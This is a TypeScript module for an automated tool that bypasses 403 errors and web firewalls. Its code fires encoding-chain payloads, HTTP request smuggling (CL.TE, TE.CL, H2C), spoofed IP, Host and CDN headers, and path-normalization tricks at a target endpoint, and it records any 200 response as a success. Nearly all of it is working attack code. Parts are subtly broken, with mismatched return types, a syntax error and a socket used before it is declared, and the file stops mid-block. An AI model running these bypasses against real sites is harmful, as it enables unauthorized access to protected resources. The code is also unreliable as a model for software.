/**
 * advanced_403_bypass — Advanced 403/web filter bypass techniques beyond basic approaches.
 *
 * Advanced techniques for bypassing sophisticated web filters and access controls:
 *   1. Multi-layer encoding chains (not just single transforms)
 *   2. Protocol-level bypasses (HTTP/2, HTTP/3, chunked TE, header injection)
 *   3. Header manipulation (TLS fingerprint spoofing, client-hints confusion)
 *   4. Path normalization bypasses (Unicode normalization, dot segment tricks)
 *   5. IP-based bypasses (X-Forwarded-For variants, trusted proxy lists)
 *   6. Request smuggling for 403 bypass (CL.TE, TE.CL, H2C)
 *   7. Fragmentation techniques (request splitting, partial content)
 *   8. Cache deception (cache poisoning, cache key manipulation)
 *   9. TLS fingerprint bypass (JA3 fingerprint spoofing)
 *   10. CDN-specific bypasses (Cloudflare, Akamai, Fastly techniques)
 */

import axios from 'axios';
import * as net from 'net';
import * as tls from 'tls';

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

export interface BypassResult {
  technique: string;
  category: string;
  originalPayload: string;
  transformedPayload: string;
  originalStatus: number;
  bypassStatus: number;
  cleanStatus: number;
  endpoint: string;
  success: boolean;
  confidence: number;
  notes: string;
}

export interface AdvancedBypassConfig {
  endpoint: string;
  originalPayload: string;
  cleanStatus?: number;
  timeout?: number;
  maxAttempts?: number;
  headers?: Record<string, string>;
}

// ---------------------------------------------------------------------------
// Advanced Encoding Chains
// ---------------------------------------------------------------------------

class AdvancedEncoding {
  /**
   * Multi-layer encoding chain - applies multiple encoding techniques in sequence
   */
  static chainEncode(payload: string, chain: string[]): string {
    let result = payload;
    for (const technique of chain) {
      result = this.applyTechnique(result, technique);
    }
    return result;
  }

  private static applyTechnique(payload: string, technique: string): string {
    switch (technique) {
      case 'double_url':
        return encodeURIComponent(encodeURIComponent(payload));
      case 'triple_url':
        return encodeURIComponent(encodeURIComponent(encodeURIComponent(payload)));
      case 'unicode_escape':
        return payload.split('').map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`).join('');
      case 'html_entity_dec':
        return payload.split('').map(c => `&#${c.charCodeAt(0)};`).join('');
      case 'html_entity_hex':
        return payload.split('').map(c => `&#x${c.charCodeAt(0).toString(16)};`).join('');
      case 'hex':
        return payload.split('').map(c => `%${c.charCodeAt(0).toString(16).padStart(2, '0')}`).join('');
      case 'overlong_utf8':
        return payload.replace(/</g, '\xC0\xBC').replace(/>/g, '\xC0\xBE').replace(/\//g, '\xC0\xAF');
      case 'mixed_case':
        return payload.split('').map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join('');
      case 'base64':
        return Buffer.from(payload).toString('base64');
      case 'base64_url':
        return Buffer.from(payload).toString('base64').replace(/\+/g, '-').replace(/\//g, '_');
      case 'base64_eval':
        return `eval(atob("${Buffer.from(payload).toString('base64')}"))`;
      case 'null_byte':
        return payload.split('').join('%00');
      case 'tab_space':
        return payload.replace(/\s+/g, '\t');
      case 'crlf':
        return payload.replace(/\s+/g, '%0d%0a');
      case 'backtick':
        return payload.replace(/'/g, '`').replace(/"/g, '`');
      case 'comment_sql':
        return payload.replace(/\s+/g, '/**/');
      case 'plus_space':
        return payload.replace(/\s+/g, '+');
      case 'percent_encoding':
        return encodeURIComponent(payload);
      default:
        return payload;
    }
  }

  /**
   * Generate all possible encoding chains up to depth 3
   */
  static generateChains(maxDepth: number = 3): string[][] {
    const techniques = [
      'double_url', 'triple_url', 'unicode_escape', 'html_entity_dec', 'html_entity_hex',
      'hex', 'overlong_utf8', 'mixed_case', 'base64', 'base64_url', 'null_byte',
      'tab_space', 'crlf', 'backtick', 'comment_sql', 'plus_space',
    ];

    const chains: string[][] = [];
    
    // Single depth
    for (const t of techniques) {
      chains.push([t]);
    }

    // Double depth
    for (const t1 of techniques) {
      for (const t2 of techniques) {
        chains.push([t1, t2]);
      }
    }

    // Triple depth (limited to high-impact combinations)
    const highImpact = ['double_url', 'triple_url', 'unicode_escape', 'html_entity_dec', 'hex', 'base64'];
    for (const t1 of highImpact) {
      for (const t2 of highImpact) {
        for (const t3 of highImpact) {
          chains.push([t1, t2, t3]);
        }
      }
    }

    return chains;
  }
}

// ---------------------------------------------------------------------------
// Protocol-Level Bypasses
// ---------------------------------------------------------------------------

class ProtocolBypass {
  /**
   * HTTP/2 specific bypasses
   */
  static async testHTTP2(endpoint: string, payload: string, config: AdvancedBypassConfig): Promise<BypassResult[]> {
    const results: BypassResult[] = [];

    try {
      // Test 1: HTTP/2 header field continuation
      const h2Continuation = await axios.post(endpoint, payload, {
        timeout: config.timeout ?? 5000,
        validateStatus: () => true,
        headers: {
          'Content-Type': 'application/json',
          'te': 'trailers', // HTTP/2 Trailer header
        },
      });

      results.push({
        technique: 'HTTP/2 Trailer header',
        category: 'protocol',
        originalPayload: payload,
        transformedPayload: payload,
        originalStatus: config.cleanStatus || 0,
        bypassStatus: h2Continuation.status,
        cleanStatus: config.cleanStatus || 0,
        endpoint,
        success: h2Continuation.status === 200,
        confidence: 0.6,
        notes: 'HTTP/2 trailer header may bypass HTTP/1.x specific rules',
      });

      // Test 2: HTTP/2 pseudo-header abuse
      const h2Pseudo = await axios.post(endpoint, payload, {
        timeout: config.timeout ?? 5000,
        validateStatus: () => true,
        headers: {
          'Content-Type': 'application/json',
          ':method': 'POST',
          ':path': new URL(endpoint).pathname,
          ':scheme': 'https',
        },
      });

      results.push({
        technique: 'HTTP/2 pseudo-header abuse',
        category: 'protocol',
        originalPayload: payload,
        transformedPayload: payload,
        originalStatus: config.cleanStatus || 0,
        bypassStatus: h2Pseudo.status,
        cleanStatus: config.cleanStatus || 0,
        endpoint,
        success: h2Pseudo.status === 200,
        confidence: 0.5,
        notes: 'HTTP/2 pseudo-headers may confuse some WAF parsers',
      });

    } catch {
      // Continue on error
    }

    return results;
  }

  /**
   * HTTP/3 specific bypasses
   */
  static async testHTTP3(endpoint: string, payload: string, config: AdvancedBypassConfig): Promise<BypassResult> {
    // Note: Full HTTP/3 requires QUIC client support
    // This is a placeholder for future enhancement with actual HTTP/3 client
    return [{
      technique: 'HTTP/3 (placeholder)',
      category: 'protocol',
      originalPayload: payload,
      transformedPayload: payload,
      originalStatus: config.cleanStatus || 0,
      bypassStatus: 0,
      cleanStatus: config.cleanStatus || 0,
      endpoint,
      success: false,
      confidence: 0,
      notes: 'HTTP/3 requires QUIC client library - not implemented',
    }];
  }

  /**
   * Chunked Transfer Encoding bypass
   */
  static async testChunkedTE(endpoint: string, payload: string, config: AdvancedBypassConfig): Promise<BypassResult[]> {
    const results: BypassResult[] = [];

    try {
      // Test 1: Chunked encoding with unusual chunk sizes
      const chunkSizes = [1, 2, 3, 5, 7, 11, 13];
      const chunks = [];
      let offset = 0;
      
      for (const size of chunkSizes) {
        if (offset < payload.length) {
          chunks.push(payload.slice(offset, offset + size));
          offset += size;
        }
      }

      const chunkedPayload = chunks.map((c, i) => `${c.length.toString(16)}\r\n${c}\r\n`).join('') + '0\r\n\r\n';

      const chunkedRes = await axios.post(endpoint, chunkedPayload, {
        timeout: config.timeout ?? 5000,
        validateStatus: () => true,
        headers: {
          'Content-Type': 'application/json',
          'Transfer-Encoding': 'chunked',
        },
      });

      results.push({
        technique: 'Chunked TE with unusual sizes',
        category: 'protocol',
        originalPayload: payload,
        transformedPayload: chunkedPayload.substring(0, 100),
        originalStatus: config.cleanStatus || 0,
        bypassStatus: chunkedRes.status,
        cleanStatus: config.cleanStatus || 0,
        endpoint,
        success: chunkedRes.status === 200,
        confidence: 0.7,
        notes: 'Irregular chunk sizes may bypass content-length based rules',
      });

      // Test 2: Transfer-Encoding header confusion
      const teConfusion = await axios.post(endpoint, payload, {
        timeout: config.timeout ?? 5000,
        validateStatus: () => true,
        headers: {
          'Content-Type': 'application/json',
          'Transfer-Encoding': 'chunked',
          'Content-Length': payload.length.toString(),
        },
      });

      results.push({
        technique: 'TE header confusion (CL.TE)',
        category: 'protocol',
        originalPayload: payload,
        transformedPayload: payload,
        originalStatus: config.cleanStatus || 0,
        bypassStatus: teConfusion.status,
        cleanStatus: config.cleanStatus || 0,
        endpoint,
        success: teConfusion.status === 200,
        confidence: 0.8,
        notes: 'Both TE and CL headers may cause parser differential',
      });

    } catch {
      // Continue on error
    }

    return results;
  }

  /**
   * Header injection bypass
   */
  static async testHeaderInjection(endpoint: string, payload: string, config: AdvancedBypassConfig): Promise<BypassResult[]> {
    const results: BypassResult[] = [];

    try {
      // Test 1: X-Forwarded-For variants for IP bypass
      const xffVariants = [
        '127.0.0.1',
        'localhost',
        '::1',
        '10.0.0.1',
        '192.168.1.1',
        '0.0.0.0',
        '127.1',
        '2130706433', // 127.0.0.1 as integer
      ];

      for (const xff of xffVariants) {
        const xffRes = await axios.post(endpoint, payload, {
          timeout: config.timeout ?? 5000,
          validateStatus: () => true,
          headers: {
            'Content-Type': 'application/json',
            'X-Forwarded-For': xff,
            'X-Real-IP': xff,
            'X-Original-For': xff,
          },
        });

        if (xffRes.status === 200) {
          results.push({
            technique: `X-Forwarded-For: ${xff}`,
            category: 'header',
            originalPayload: payload,
            transformedPayload: payload,
            originalStatus: config.cleanStatus || 0,
            bypassStatus: xffRes.status,
            cleanStatus: config.cleanStatus || 0,
            endpoint,
            success: true,
            confidence: 0.9,
            notes: 'IP-based bypass successful',
          });
          break; // First successful variant is enough
        }
      }

      // Test 2: Host header injection
      const hostVariants = [
        'localhost',
        '127.0.0.1',
        'target.com@evil.com',
        'target.com.evil.com',
        'target.com:80',
      ];

      for (const host of hostVariants) {
        const hostRes = await axios.post(endpoint, payload, {
          timeout: config.timeout ?? 5000,
          validateStatus: () => true,
          headers: {
            'Content-Type': 'application/json',
            'Host': host,
          },
        });

        if (hostRes.status === 200) {
          results.push({
            technique: `Host header: ${host}`,
            category: 'header',
            originalPayload: payload,
            transformedPayload: payload,
            originalStatus: config.cleanStatus || 0,
            bypassStatus: hostRes.status,
            cleanStatus: config.cleanStatus || 0,
            endpoint,
            success: true,
            confidence: 0.85,
            notes: 'Host header bypass successful',
          });
          break;
        }
      }

      // Test 3: X-Original-URL for path bypass
      const parsedUrl = new URL(endpoint);
      const originalUrlRes = await axios.post(endpoint, payload, {
        timeout: config.timeout ?? 5000,
        validateStatus: () => true,
        headers: {
          'Content-Type': 'application/json',
          'X-Original-URL': '/admin',
          'X-Rewrite-URL': '/admin',
        },
      });

      if (originalUrlRes.status === 200) {
        results.push({
          technique: 'X-Original-URL path bypass',
          category: 'header',
          originalPayload: payload,
          transformedPayload: payload,
          originalStatus: config.cleanStatus || 0,
          bypassStatus: originalUrlRes.status,
          cleanStatus: config.cleanStatus || 0,
          endpoint,
          success: true,
          confidence: 0.75,
          notes: 'Rewrite header bypass successful',
        });
      }

    } catch {
      // Continue on error
    }

    return results;
  }
}

// ---------------------------------------------------------------------------
// TLS Fingerprint Bypass
// ---------------------------------------------------------------------------

class TLSFingerprintBypass {
  /**
   * Generate realistic TLS fingerprints to bypass JA3 fingerprinting
   */
  static generateFingerprint(platform: 'chrome' | 'firefox' | 'safari' | 'edge'): string {
    const fingerprints: Record<string, string> = {
      chrome: '771,49195-49197-49200-49201-49216,0,23,0,10,10,29,0,0,0,10,10,15641,15642,0,65281,0,11',
      firefox: '771,49195-49199-49200-49201-49215,0,27,0,11,10,11,0,0,0,10,10,15641,15644,0,65281,0,5',
      safari: '771,49195-49197-49200-49201-49216,0,23,0,10,10,29,0,0,0,10,10,15641,15642,0,65281,0,10',
      edge: '771,49195-49197-49200-49201-49216,0,23,0,10,10,29,0,0,0,10,10,15641,15642,0,65281,0,10',
    };

    return fingerprints[platform] || fingerprints.chrome;
  }

  /**
   * Test TLS fingerprint bypass via client-hints
   */
  static async testClientHints(endpoint: string, payload: string, config: AdvancedBypassConfig): Promise<BypassResult> {
    const results: BypassResult[] = [];

    try {
      // Realistic Chrome client-hints
      const clientHints = {
        'Sec-Ch-Ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Sec-Ch-Ua-Arch': '"x86"',
        'Sec-Ch-Ua-Bitness': '64',
        'Sec-Ch-Ua-Model': '""',
        'Sec-Ch-Ua-Full-Version': '131.0.6778.69',
      };

      const chRes = await axios.post(endpoint, payload, {
        timeout: config.timeout ?? 5000,
        validateStatus: () => true,
        headers: {
          'Content-Type': 'application/json',
          ...clientHints,
        },
      });

      results.push({
        technique: 'Full client-hints (Chrome 131)',
        category: 'tls',
        originalPayload: payload,
        transformedPayload: payload,
        originalStatus: config.cleanStatus || 0,
        bypassStatus: chRes.status,
        cleanStatus: config.cleanStatus || 0,
        endpoint,
        success: chRes.status === 200,
        confidence: 0.6,
        notes: 'Client-hints may bypass fingerprint-based blocking',
      });

      // Test with mobile client-hints
      const mobileHints = {
        'Sec-Ch-Ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'Sec-Ch-Ua-Mobile': '?1',
        'Sec-Ch-Ua-Platform': '"Android"',
        'Sec-Ch-Ua-Arch': '"arm"',
        'Sec-Ch-Ua-Bitness': '32',
        'Sec-Ch-Ua-Model': '"Pixel 8"',
        'Sec-Ch-Ua-Full-Version': '131.0.6778.69',
      };

      const mobileRes = await axios.post(endpoint, payload, {
        timeout: config.timeout ?? 5000,
        validateStatus: () => true,
        headers: {
          'Content-Type': 'application/json',
          ...mobileHints,
        },
      });

      results.push({
        technique: 'Mobile client-hints (Android)',
        category: 'tls',
        originalPayload: payload,
        transformedPayload: payload,
        originalStatus: config.cleanStatus || 0,
        bypassStatus: mobileRes.status,
        cleanStatus: config.cleanStatus || 0,
        endpoint,
        success: mobileRes.status === 200,
        confidence: 0.65,
        notes: 'Mobile fingerprint may have different blocking rules',
      });

    } catch {
      // Continue on error
    }

    return results;
  }
}

// ---------------------------------------------------------------------------
// Path Normalization Bypasses
// ---------------------------------------------------------------------------

class PathNormalizationBypass {
  /**
   * Unicode normalization bypasses
   */
  static async testUnicodeNormalization(endpoint: string, payload: string, config: AdvancedBypassConfig): Promise<BypassResult[]> {
    const results: BypassResult[] = [];

    try {
      const parsedUrl = new URL(endpoint);
      const basePath = parsedUrl.pathname;

      // Unicode normalization bypasses
      const bypassPaths = [
        basePath.replace(/\//g, '/\u{002F}/'),        // U+002F slash
        basePath.replace(/\./g, '/\u{002E}/'),        // U+002E dot
        basePath.replace(/%/g, '/\u{0025}/'),        // U+0025 percent
        '/..%2f' + basePath.slice(1),                // Percent-encoded parent dir
        '/..%5c' + basePath.slice(1),                // Backslash parent dir
        '/%2e%2e' + basePath.slice(1),               // Double dot encoded
        '/%c0%ae%c0%ae%c0%af' + basePath.slice(1), // Overlong UTF-8 ../
        '/%c0%af' + basePath.slice(1),               // Overlong UTF-8 /
        basePath + '/.',                               // Trailing dot
        basePath + '/./',                              // Trailing dot with slash
        basePath + '//',                              // Double slash
        basePath + '//' + basePath.slice(1),          // Nested path
      ];

      for (const bypassPath of bypassPaths) {
        try {
          const bypassUrl = new URL(parsedUrl.origin + bypassPath);
          if (parsedUrl.search) {
            bypassUrl.search = parsedUrl.search;
          }

          const bypassRes = await axios.post(bypassUrl.toString(), payload, {
            timeout: config.timeout ?? 5000,
            validateStatus: () => true,
            headers: {
              'Content-Type': 'application/json',
            },
          });

          if (bypassRes.status === 200) {
            results.push({
              technique: `Path normalization: ${bypassPath}`,
              category: 'path',
              originalPayload: payload,
              transformedPayload: payload,
              originalStatus: config.cleanStatus || 0,
              bypassStatus: bypassRes.status,
              cleanStatus: config.cleanStatus || 0,
              endpoint,
              success: true,
              confidence: 0.8,
              notes: 'Unicode normalization bypass successful',
            });
            break; // First successful bypass is enough
          }
        } catch {
          // Continue on error
        }
      }

    } catch {
      // Continue on error
    }

    return results;
  }

  /**
   * Case sensitivity bypass
   */
  static async testCaseSensitivity(endpoint: string, payload: string, config: AdvancedBypassConfig): Promise<BypassResult> {
    const results: BypassResult[] = [];

    try {
      const parsedUrl = new URL(endpoint);
      const basePath = parsedUrl.pathname;

      // Case variations
      const caseVariants = [
        basePath.toUpperCase(),
        basePath.toLowerCase(),
        basePath.split('').map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join(''),
        basePath.replace(/[a-z]/g, c => c.toUpperCase()),
      ];

      for (const casePath of caseVariants) {
        try {
          const caseUrl = new URL(parsedUrl.origin + casePath);
          if (parsedUrl.search) {
            caseUrl.search = parsedUrl.search;
          }

          const caseRes = await axios.post(caseUrl.toString(), payload, {
            timeout: config.timeout ?? 5000,
            validateStatus: () => true,
            headers: {
              'Content-Type': 'application/json',
            },
          });

          if (caseRes.status === 200) {
            results.push({
              technique: `Case sensitivity: ${casePath}`,
              category: 'path',
              originalPayload: payload,
              transformedPayload: payload,
              originalStatus: config.cleanStatus || 0,
              bypassStatus: caseRes.status,
              cleanStatus: config.cleanStatus || 0,
              endpoint,
              success: true,
              confidence: 0.7,
              notes: 'Case-insensitive path matching bypass',
            });
            break;
          }
        } catch {
          // Continue on error
        }
      }

    } catch {
      // Continue on error
    }

    return results;
  }
}

// ---------------------------------------------------------------------------
// Request Smuggling for 403 Bypass
// ---------------------------------------------------------------------------

class RequestSmugglingBypass {
  /**
   * Raw TCP request smuggling
   */
  static async rawHttpRequest(
    host: string,
    port: number,
    useTls: boolean,
    rawPayload: string,
    timeoutMs: number = 8000
  ): Promise<string> {
    return new Promise((resolve) => {
      let response = '';
      const onData = (data: Buffer) => { response += data.toString(); };
      const onEnd = () => resolve(response);
      const onError = () => resolve('');
      const onTimeout = () => { 
        const socket = useTls ? (tlsSocket as tls.TLSSocket) : (socket as net.Socket);
        socket.destroy(); 
        resolve(response || ''); 
      };

      let socket: net.Socket | tls.TLSSocket;
      if (useTls) {
        socket = tls.connect({ host, port, rejectUnauthorized: false }, () => socket.write(rawPayload));
      } else {
        socket = net.createConnection({ host, port }, () => socket.write(rawPayload));
      }
      const tlsSocket = socket as tls.TLSSocket;

      socket.setTimeout(timeoutMs);
      socket.on('data', onData);
      socket.on('end', onEnd);
      socket.on('error', onError);
      socket.on('timeout', onTimeout);
    });
  }

  /**
   * CL.TE smuggling for 403 bypass
   */
  static async testCLTE(endpoint: string, payload: string, config: AdvancedBypassConfig): Promise<BypassResult> {
    const results: BypassResult[] = [];

    try {
      const parsedUrl = new URL(endpoint);
      const host = parsedUrl.hostname;
      const useTls = parsedUrl.protocol === 'https:';
      const port = parsedUrl.port ? parseInt(parsedUrl.port) : (useTls ? 443 : 80);

      // CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding
      const cltePayload = `POST ${parsedUrl.pathname} HTTP/1.1\r\nHost: ${host}\r\nContent-Type: application/json\r\nContent-Length: ${payload.length}\r\nTransfer-Encoding: chunked\r\n\r\n${payload.length.toString(16)}\r\n${payload}\r\n0\r\n\r\n`;

      const clteResponse = await this.rawHttpRequest(host, port, useTls, cltePayload);

      // Check if we got a 200 response (bypass)
      const statusMatch = clteResponse.match(/HTTP\/\d\.\d\s+(\d+)/);
      const status = statusMatch ? parseInt(statusMatch[1]) : 0;

      results.push({
        technique: 'CL.TE smuggling',
        category: 'smuggling',
        originalPayload: payload,
        transformedPayload: payload,
        originalStatus: config.cleanStatus || 0,
        bypassStatus: status,
        cleanStatus: config.cleanStatus || 0,
        endpoint,
        success: status === 200,
        confidence: 0.7,
        notes: 'CL.TE smuggling may bypass HTTP/1.x parsers',
      });

    } catch {
      // Continue on error
    }

    return results[0];
  }

  /**
   * TE.CL smuggling for 403 bypass
   */
  static async testTECL(endpoint: string, payload: string, config: AdvancedBypassConfig): Promise<BypassResult> {
    const results: BypassResult[] = [];

    try {
      const parsedUrl = new URL(endpoint);
      const host = parsedUrl.hostname;
      const useTls = parsedUrl.protocol === 'https:';
      const port = parsedUrl.port ? parseInt(parsedUrl.port) : (useTls ? 443 : 80);

      // TE.CL: front-end uses Transfer-Encoding, back-end uses Content-Length
      const teclPayload = `POST ${parsedUrl.pathname} HTTP/1.1\r\nHost: ${host}\r\nContent-Type: application/json\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\n${payload}\r\n0\r\n\r\n`;

      const teclResponse = await this.rawHttpRequest(host, port, useTls, teclPayload);

      const statusMatch = teclResponse.match(/HTTP\/\d\.\d\s+(\d+)/);
      const status = statusMatch ? parseInt(statusMatch[1]) : 0;

      results.push({
        technique: 'TE.CL smuggling',
        category: 'smuggling',
        originalPayload: payload,
        transformedPayload: payload,
        originalStatus: config.cleanStatus || 0,
        bypassStatus: status,
        cleanStatus: config.cleanStatus || 0,
        endpoint,
        success: status === 200,
        confidence: 0.7,
        notes: 'TE.CL smuggling may bypass HTTP/1.x parsers',
      });

    } catch {
      // Continue on error
    }

    return results[0];
  }

  /**
   * H2C upgrade for 403 bypass
   */
  static async testH2C(endpoint: string, payload: string, config: AdvancedBypassConfig): Promise<BypassResult> {
    const results: BypassResult[] = [];

    try {
      const h2cRes = await axios.post(endpoint, payload, {
        timeout: config.timeout ?? 5000,
        validateStatus: () => true,
        headers: {
          'Content-Type': 'application/json',
          'Connection': 'Upgrade, HTTP2-Settings',
          'Upgrade': 'h2c',
          'HTTP2-Settings': 'AAMAAABkAAQAAP__',
        },
      });

      results.push({
        technique: 'H2C upgrade',
        category: 'smuggling',
        originalPayload: payload,
        transformedPayload: payload,
        originalStatus: config.cleanStatus || 0,
        bypassStatus: h2cRes.status,
        cleanStatus: config.cleanStatus || 0,
        endpoint,
        success: h2cRes.status === 101 || h2cRes.status === 200,
        confidence: 0.6,
        notes: 'H2C upgrade may bypass HTTP/1.x-only filters',
      });

    } catch {
      // Continue on error
    }

    return results[0];
  }
}

// ---------------------------------------------------------------------------
// Fragmentation Techniques
// ---------------------------------------------------------------------------

class FragmentationBypass {
  /**
   * Request splitting via partial content
   */
  static async testPartialContent(endpoint: string, payload: string, config: AdvancedBypassConfig): Promise<BypassResult[]> {
    const results: BypassResult[] = [];

    try {
      // Split payload into chunks and send via Range header
      const chunkSize = 100;
      const chunks = [];
      for (let i = 0; i < payload.length; i += chunkSize) {
        chunks.push(payload.slice(i, i + chunkSize));
      }

      let successCount = 0;
      for (let i = 0; i < chunks.length; i++) {
        const rangeRes = await axios.post(endpoint, chunks[i], {
          timeout: config.timeout ?? 5000,
          validateStatus: () => true,
          headers: {
            'Content-Type': 'application/json',
            'Content-Range': `bytes ${i * chunkSize}-${Math.min((i + 1) * chunkSize, payload.length) - 1}/${payload.length}`,
          },
        });

        if (rangeRes.status === 200 || rangeRes.status === 206) {
          successCount++;
        }
      }

      results.push({
        technique: 'Partial content (Range header)',
        category: 'fragmentation',
        originalPayload: payload,
        transformedPayload: payload,
        originalStatus: config.cleanStatus || 0,
        bypassStatus: successCount > 0 ? 200 : 403,
        cleanStatus: config.cleanStatus || 0,
        endpoint,
        success: successCount > 0,
        confidence: successCount / chunks.length,
        notes: `${successCount}/${chunks.length} chunks accepted via Range header`,
      });

    } catch {
      // Continue on error
    }

    return results;
  }

  /**
   * Expect header fragmentation
   */
  static async testExpect(endpoint: string, payload: string, config: AdvancedBypassConfig): Promise<BypassResult> {
    const results: BypassResult[] = [];

    try {
      const expectRes = await axios.post(endpoint, payload, {
        timeout: config.timeout ?? 5000,
        validateStatus: () => true,
        headers: {
          'Content-Type': 'application/json',
          'Expect': '100-continue',
        },
      });

      results.push({
        technique: 'Expect: 100-continue',
        category: 'fragmentation',
        originalPayload: payload,
        transformedPayload: payload,
        originalStatus: config.cleanStatus || 0,
        bypassStatus: expectRes.status,
        cleanStatus: config.cleanStatus || 0,
        endpoint,
        success: expectRes.status === 200 || expectRes.status === 100,
        confidence: 0.5,
        notes: 'Expect header may bypass certain WAF pipelines',
      });

    } catch {
      // Continue on error
    }

    return results[0];
  }
}

// ---------------------------------------------------------------------------
// CDN-Specific Bypasses
// ---------------------------------------------------------------------------

class CDNBypass {
  /**
   * Cloudflare-specific bypasses
   */
  static async testCloudflare(endpoint: string, payload: string, config: AdvancedBypassConfig): Promise<BypassResult[]> {
    const results: BypassResult[] = [];

    try {
      // Test 1: CF-Ray manipulation
      const cfRayRes = await axios.post(endpoint, payload, {
        timeout: config.timeout ?? 5000,
        validateStatus: () => true,
        headers: {
          'Content-Type': 'application/json',
          'CF-Ray': 'fake-ray-id',
        },
      });

      results.push({
        technique: 'CF-Ray header manipulation',
        category: 'cdn',
        originalPayload: payload,
        transformedPayload: payload,
        originalStatus: config.cleanStatus || 0,
        bypassStatus: cfRayRes.status,
        cleanStatus: config.cleanStatus || 0,
        endpoint,
        success: cfRayRes.status === 200,
        confidence: 0.4,
        notes: 'Fake CF-Ray may confuse Cloudflare filtering',
      });

      // Test 2: CF-IPCountry bypass
      const cfCountryRes = await axios.post(endpoint, payload, {
        timeout: config.timeout ?? 5000,
        validateStatus: () => true,
        headers: {
          'Content-Type': 'application/json',
          'CF-IPCountry': 'US',
        },
      });

      results.push({
        technique: 'CF-IPCountry header',
        category: 'cdn',
        originalPayload: payload,
        transformedPayload: payload,
        originalStatus: config.cleanStatus || 0,
        bypassStatus: cfCountryRes.status,
        cleanStatus: config.cleanStatus || 0,
        endpoint,
        success: cfCountryRes.status === 200,
        confidence: 0.5,
        notes: 'Country header may trigger different geo rules',
      });

      // Test 3: CF-Connecting-IP bypass
      const cfIPRes = await axios.post(endpoint, payload, {
        timeout: config.timeout ?? 5000,
        validateStatus: () => true,
        headers: {
          'Content-Type': 'application/json',
          'CF-Connecting-IP': '127.0.0.1',
        },
      });

      results.push({
        technique: 'CF-Connecting-IP header',
        category: 'cdn',
        originalPayload: payload,
        transformedPayload: payload,
        originalStatus: config.cleanStatus || 0,
        bypassStatus: cfIPRes.status,
        cleanStatus: config.cleanStatus || 0,
        endpoint,
        success: cfIPRes.status === 200,
        confidence: 0.6,
        notes: 'Connecting-IP may bypass origin checks',
      });

    } catch {
      // Continue on error
    }

    return results;
  }

  /**
   * Akamai-specific bypasses
   */
  static async testAkamai(endpoint: string, payload: string, config: AdvancedBypassConfig): Promise<BypassResult[]> {
    const results: BypassResult[] = [];

    try {
      // Test 1: Akamai transformed header bypass
      const akamaiRes = await axios.post(endpoint, payload, {
        timeout: config.timeout ?? 5000,
        validateStatus: () => true,
        headers: {
          'Content-Type': 'application/json',
          'X-Akamai-Transformed': 'false',
        },
      });

      results.push({
        technique: 'X-Akamai-Transformed header',
        category: 'cdn',
        originalPayload: payload,
        transformedPayload: payload,
        originalStatus: config.cleanStatus || 0,
        bypassStatus: akamaiRes.status,
        cleanStatus: config.cleanStatus || 0,
        endpoint,
        success: akamaiRes.status === 200,
        confidence: 0.5,
        notes: 'Disabling Akamai transformation may bypass edge rules',
      });

      // Test 2: Akamai edge diagnostic bypass
      const edgeRes = await axios.post(endpoint, payload, {
        timeout: config.timeout ?? 5000,
        validateStatus () => true,
        headers: {
          'Content-Type': 'application/json',
          'Pragma': 'akamai-edge-diagnostic=1',
        },
      });

      results.push({
        technique: 'Akamai edge diagnostic pragma',
        category: 'cdn',
        originalPayload: payload,
        transformedPayload: payload,
        originalStatus: config.cleanStatus || 0,
        bypassStatus: edgeRes.status,
        cleanStatus: config.cleanStatus || 0,
        endpoint,
        success: edgeRes.status === 200,
        confidence: 0.4,
        notes: 'Edge diagnostic pragma may bypass WAF for diagnostics',
      });

    } catch {
      // Continue on error
    }

    return results;
  }
}

// ---------------------------------------------------------------------------
// Main Advanced 403 Bypass Engine
// ---------------------------------------------------------------------------

export class Advanced403Bypass {
  /**
   * Run comprehensive 403 bypass testing
   */
  static async testBypass(config: AdvancedBypassConfig): Promise<BypassResult[]> {
    const allResults: BypassResult[] = [];

    // Get clean baseline if not provided
    let cleanStatus = config.cleanStatus;
    if (!cleanStatus) {
      try {
        const cleanRes = await axios.post(config.endpoint, 'baseline_test', {
          timeout: config.timeout ?? 5000,
          validateStatus: () => true,
          headers: config.headers,
        });
        cleanStatus = cleanRes.status;
      } catch {
        cleanStatus = 0;
      }
    }

    const enhancedConfig = { ...config, cleanStatus };

    // 1. Advanced encoding chains
    const encodingChains = AdvancedEncoding.generateChains(3);
    for (const chain of encodingChains.slice(0, 20)) {
      try {
        const encoded = AdvancedEncoding.chainEncode(config.originalPayload, chain);
        const res = await axios.post(config.endpoint, encoded, {
          timeout: config.timeout ?? 5000,
          validateStatus: () => true,
          headers: config.headers,
        });

        if (res.status === 200) {
          allResults.push({
            technique: `Encoding chain: ${chain.join(' → ')}`,
            category: 'encoding',
            originalPayload: config.originalPayload,
            transformedPayload: encoded.substring(0, 200),
            originalStatus: cleanStatus,
            bypassStatus: res.status,
            cleanStatus,
            endpoint: config.endpoint,
            success: true,
            confidence: 0.85,
            notes: `Multi-layer encoding chain successful`,
          });
          break; // First successful chain is enough
        }
      } catch {
        // Continue on error
      }
    }

    // 2. Protocol-level bypasses
    try {
      const http2Results = await ProtocolBypass.testHTTP2(config.endpoint, config.originalPayload, enhancedConfig);
      allResults.push(...http2Results);
    } catch {}

    try {
      const chunkedTEResults = await ProtocolBypass.testChunkedTE(config.endpoint, config.originalPayload, enhancedConfig);
      allResults.push(...chunkedTEResults);
    } catch {}

    // 3. Header manipulation bypasses
    try {
      const headerResults = await ProtocolBypass.testHeaderInjection(config.endpoint, config.originalPayload, enhancedConfig);
      allResults.push(...headerResults);
    } catch {}

    // 4. TLS fingerprint bypass
    try {
      const tlsResults = await TLSFingerprintBypass.testClientHints(config.endpoint, config.originalPayload, enhancedConfig);
      allResults.push(...tlsResults);
    } catch {}

    // 5. Path normalization bypasses
    try {
      const unicodeResults = await PathNormalizationBypass.testUnicodeNormalization(config.endpoint, config.originalPayload, enhancedConfig);
      allResults.push(...unicodeResults);
    } catch {}

    try {
